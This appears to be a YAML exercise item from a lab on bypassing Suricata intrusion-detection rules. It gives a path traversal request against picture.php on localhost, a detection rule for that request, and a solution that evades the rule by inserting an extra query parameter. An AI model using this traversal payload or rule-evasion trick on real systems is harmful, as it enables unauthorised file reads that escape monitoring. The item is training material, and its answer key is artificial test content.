name: 'Path Traversal (Param) 1'
type: 'exploit'
divider_before: 'Bypass Suricata (part 2)'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Fetch /var/www/html/picture.php**

hints: []

target: sighting

base_request: |-
  GET /picture.php?file=../../../../../../../var/www/html/picture.php HTTP/1.1
  Host: localhost

solution: |-
  GET /picture.php?a=b&file=../../../../../../../var/www/html/picture.php HTTP/1.1
  Host: localhost

solution_note: Add an extra argument (?a=b&)

rules:
# ?file=
  - >
    alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "/picture.php?file="; content: "../"; sid:123456; rev:1;)

expected_output: "mime_content_type"
